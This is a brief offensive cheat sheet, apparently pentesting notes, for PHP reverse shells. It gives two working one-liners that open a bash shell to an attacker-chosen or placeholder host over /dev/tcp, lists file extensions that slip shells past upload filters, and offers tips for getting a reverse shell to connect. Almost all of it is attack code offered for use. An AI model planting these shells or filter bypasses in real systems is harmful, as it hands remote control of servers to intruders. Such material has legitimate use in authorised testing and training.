### PHP Shells
* User Supplied IP and Port
```php
<?php $ip=$_GET['ip']; $port=$_GET['port']; $string = \"/bin/bash -c 'bash -i >& /dev/tcp/\".$ip.\"/\".$port.\" 0>&1'\"; exec($string); ?>
```
* Hardcoded IP and Port
```php
<?php exec(\'/bin/bash -c \"bash -i >& /dev/tcp/<<ATTACKER IP>>/<<PORT>> 0>&1\"\'); ?>
```

## Extensions
* .phtml 
* .PHP
* .php;.txt
* .php%00

## Tips for troubleshooting reverse shell
* ssh into victim box and test out bash command 
* Run php from the box directly
```
$ php -f phpshell.php
```
* Attempt port 443
* Try a different shell
* Confirm OS (Linux or Windows)